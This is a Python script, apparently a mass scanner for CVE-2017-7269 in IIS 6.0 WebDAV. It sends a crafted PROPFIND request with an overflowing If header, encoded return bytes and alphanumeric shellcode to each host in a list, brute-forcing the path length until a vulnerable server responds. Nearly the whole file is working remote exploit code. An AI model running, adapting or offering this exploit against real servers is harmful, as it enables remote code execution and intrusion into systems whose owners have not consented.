#coding:utf-8
import socket,sys
import os

socket.setdefaulttimeout(3)

def exploit(host,port,pathLen):


    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    sock.connect((host,port))
    host = "localhost123"
    pay='PROPFIND / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n'.format(host)
    padding = 'a'*(114-pathLen)
    domain = "http://"+host+":"+str(port)+"/"
    pay+='If: <'
    pay+=domain
    pay+=padding
    pay+='\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
    pay+='>'
    pay+=' (Not <locktoken:write1>) <'
    pay+=domain
    pay+=padding
    pay+='\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'
    shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A'
    pay+=shellcode
    pay+='>\r\n\r\n'
    #print pay
    sock.send(pay)  
    data = sock.recv(80960)
    #print data
    return data
    sock.close

def is_alive(host,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host,port))
        sock.close
        return True
    except:
        return False

def bruteLen(host,port):
    for i in range(3,115):
        try:
            data = exploit(host,port,i)
            #print data
            if "CVE-2017-7269" in data:
                #print('\033[1;32;40m [+] Length is {} \033[0m'.format(str(i)))
                return i
                break
        except Exception as e:
            print(e)
    return 0
def main():
    os.system("")
    usage = "\033[5;34;40m IIS6_WebDAV_Scanner by AdminTony \033[0m\n\033[1;34;40m [+] Usage:\n [+] {} -p tasklist.txt  # Brute the length of physical path\n [+] {} -p tasklist.txt -l length # Use the fixed length of physical path \033[0m".format(sys.argv[0],sys.argv[0])
    if(len(sys.argv)<3):
        print(usage)
        exit()
    elif len(sys.argv)==3:
        tasklist = sys.argv[2]
        method = 1
    elif len(sys.argv)==5:
        tasklist = sys.argv[2]
        method = 2
        length = int(sys.argv[4])
    else:
        print(usage)
        exit()
    with open(tasklist) as f:
        tlist = f.readlines()
        task = []
        for tmp in tlist:
            try:
                tmp = tmp.split("\n")[0]
            except:
                tmp = tmp
            if ":" in tmp:
                task.append((tmp.split(":")[0],tmp.split(":")[1]))
            else:
                task.append((tmp,80))
        #print(task)
    if method == 1:
        for domain in task:
            #print(domain)
            print('\033[1;32;40m [+] Testing {}:{} \033[0m'.format(domain[0],domain[1]))
            if(is_alive(domain[0],int(domain[1]))):
                pass
            else:
                print("\033[1;35;40m [Result] {}:{} connect timeout \033[0m".format(domain[0],domain[1]))
                continue
            Pathlength = bruteLen(domain[0],int(domain[1]))
            if not Pathlength:
                print("\033[1;35;40m [Result] {}:{} is not vulnerable \033[0m".format(domain[0],domain[1]))
            else:
                print("\033[1;34;40m [Result] {}:{} is vulnerable \n [Result] Length is {} \033[0m".format(domain[0],domain[1],Pathlength))
    else:
        for domain in task:
            print('\033[1;32;40m [+] Testing {}:{} \033[0m'.format(domain[0],domain[1]))
            if(is_alive(domain[0],int(domain[1]))):
                pass
            else:
                print("\033[1;35;40m [Result] {}:{} connect timeout \033[0m".format(domain[0],domain[1]))
                continue
            data = exploit(domain[0],int(domain[1]),length)
            if "CVE-2017-7269" in data:
                print("\033[1;34;40m [Result] {}:{} is vulnerable \n [Result] Length is {} \033[0m".format(domain[0],domain[1],length))
            else:
                print("\033[1;35;40m [Result] {}:{} is not vulnerable \033[0m".format(domain[0],domain[1]))
main()
#exploit(host,port,pathLen)\033[1;35m
